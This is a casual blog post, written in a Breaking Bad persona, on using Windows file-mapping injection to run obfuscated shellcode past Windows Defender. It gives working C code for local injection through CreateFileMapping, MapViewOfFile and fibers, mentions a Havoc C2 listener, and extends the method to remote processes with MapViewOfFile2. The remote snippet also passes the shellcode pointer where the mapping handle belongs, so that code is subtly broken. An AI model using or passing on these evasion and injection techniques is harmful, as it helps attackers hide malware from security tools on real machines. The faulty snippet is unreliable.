+++ 
draft = false
date = 2025-07-11T22:47:27+10:00
title = "Intro to Windows Internals"
description = ""
slug = ""
authors = ["Jesse Pinkman"]
tags = []
categories = ["Windows dev"]
externalLink = ""
series = []
+++

Yo, yo, yo! 1-4-8-3 to the 3 to the 6 to the 9. Representin' the ABQ — what up, b****?

So today, I woke up, drank my morning coffee, and while reading the newsletter, it crossed my mind to try using mapping injection technique to bypass Windows Defender — and bring back that red team glory.

<img src="/images/mapping/me-rare.jpg" alt=""
     style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;">


## You can create Dora's map in Windows 

So what we're actually going to do is execute our shellcode in memory using different Windows APIs, instead of using VirtualAlloc or VirtualAllocEx, which are heavily monitored by security solutions.

"So Mr. Mysterious, how are you going to allocate memory for your shellcode to execute?"

We won't allocate memory. We'll use existing memory.
Windows Defender won’t see it coming. 💀

<img src="/images/mapping/evil.jpg" alt=""
     style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;">


Basically, we will map an unused memory region to our process’s virtual address space called a file mapping object using the WinAPI [CreateFileMapping](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga). This memory region does not need to be backed by a file; instead, you can put whatever data you want there. So, your process is executing in its own address space, and the file mapping object holds your shellcode.

Fun fact: This memory region can also be shared with other processes, unlike memory allocated with VirtualAlloc, which cannot be shared.

In simple terms, imagine creating a public storage locker on your property that other people can come and use for whatever reason.


## Yeah Mr. White! Yeah Science!

Note: I obfuscated my shellcode to look like a MAC address using [hellshell](https://github.com/NUL0x4C/HellShell) again :) and my havoc c2 is up and running in the background.


Let's create a function that:

- Takes the shellcode address and its size.

- Returns a pointer to the mapped memory region that will eventually contain the shellcode.

{{< highlight c >}}

BOOL map_inj(PVOID shell_add, SIZE_T shell_size, OUT PVOID *map_address) {


	HANDLE Hmap = NULL;
	PVOID modified_map = NULL;

// Map a memory region into our process with PAGE_EXECUTE_READWRITE permissions

	Hmap = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, shell_size, NULL);
	if (Hmap == NULL) {
			printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
			return FALSE;
		}


{{< /highlight >}}

Then we will use the WinAPI [MapViewOfFile](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile) to open the mapped region and make it writable and executable. After that, we’ll simply copy the shellcode into the mapped memory.


{{< highlight c >}}

// Modifying the mapped memory to make it writable and executable
	modified_map = MapViewOfFile(Hmap, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, shell_size);

	if (modified_map == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    // copying the shellcode to the mapped memory 
	memcpy(modified_map, shell_add, shell_size);


    // Retrieving the address of the modified mapped memory

	*map_address = modified_map;

    // Closing the file mapping handle to free system resources
	if (Hmap) {
	
		CloseHandle(Hmap);
	}


	return TRUE;

}

{{< /highlight >}}




In main, we’ll use [fibers](https://aft3rd4rk.github.io/posts/fiber-injection/) instead of CreateThread for execution (stealthier).
We also call MacDeobfuscation to decode the MAC-address-like shellcode into raw bytes before injecting it.



{{< highlight c >}}
int main()
{

	

	PVOID  mapped_address = NULL;

	// I will use fibers to execute the shellcode instead of using CreateThread
	PVOID fiber1 = ConvertThreadToFiber(NULL);


	// used to store size and the new address of the shellcode after deobfuscation 
	PVOID raw_shell_add = NULL;
	SIZE_T raw_shell_size = NULL;


	if (fiber1 == NULL) {
		printf("[-] Failed to convert thread to fiber.\n");
		return 1;
	}
	
    //  Deobfuscating the shellcode
	MacDeobfuscation(MacArray, NumberOfElements, &raw_shell_add, &raw_shell_size);


	if (!map_inj(raw_shell_add, raw_shell_size,&mapped_address ))
	{
		return -1;
	}


	PVOID fiber2 = CreateFiber(NULL, (LPFIBER_START_ROUTINE)mapped_address, NULL);

	SwitchToFiber(fiber2);


	return 1;
   
}

{{< /highlight >}}



## Let's Cook Mr. White

<img src="/images/mapping/ironman.jpg" alt=""
     style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;">



The Result: 


<video width="640" height="360" controls>
  <source src="/vidoes\map-inj\inj.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>




<img src="/images/mapping/ez.gif" alt=""
     style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;">

That’s it for today . Time to embrace my toxic side, jump into Marvel Rivals, and spam “skill issue” after every win.


## EXTRA CRISPY 


Ah, I see you're still here. Well then... let's take this further and inject into a remote process.

Remember at the beginning when I mentioned that file-mapped memory regions can be shared with other processes? We’re going to abuse that feature.

All you need is a handle to the target process (I’ll assume you already have it). You can get one using the WinAPI function [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess). 

You’ll follow the same steps as before — creating a file mapping object and preparing your shellcode — but when it comes time to map the memory region, that’s where things change.

Instead of just using MapViewOfFile again, we’ll use [MapViewOfFile2](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile2).

Why MapViewOfFile2 and not the original [MapViewOfFile](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile)?
Because the original function maps the view only into the calling process (your local one). If you call it again, it still affects your own address space.

But MapViewOfFile2 gives you the power to map the memory into a remote process’s address space. That way, your shellcode will be accessible and executable inside the target process.

Here is the code: 



{{< highlight c >}}

// Modifying the mapped memory to make it writable and executable
	modified_map = MapViewOfFile(Hmap, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, shell_size);

	if (modified_map == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    // copying the shellcode to the mapped memory 
	memcpy(modified_map, shell_add, shell_size);

// hProc is the handle you got from the target process 
    PVOID remote_map = NULL;

   remote_map = MapViewOfFile2(shell_add, hProc, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);


    // Retrieving the address of the modified mapped memory

	*map_address =  remote_map;

    // Closing the file mapping handle to free system resources
	if (Hmap) {
	
		CloseHandle(Hmap);
	}


	return TRUE;

}

{{< /highlight >}}


Just some quick notes:
- Modify your function to take a handle to the target process as a parameter. You’ll need it for mapping the file view into the remote process using MapViewOfFile2.

- In your main function, you’ll need to create a remote thread in the target process using the WinAPI function CreateRemoteThreadEx.

- You can’t create fibers in a remote process — fibers exist only in the context of the current thread, and there’s no thread context to convert in a remote process.